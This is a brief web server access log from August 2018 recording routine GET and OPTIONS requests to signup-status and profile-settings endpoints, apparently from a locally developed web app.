ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:26 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:54:26 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:26 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:55:01 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:55:01 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
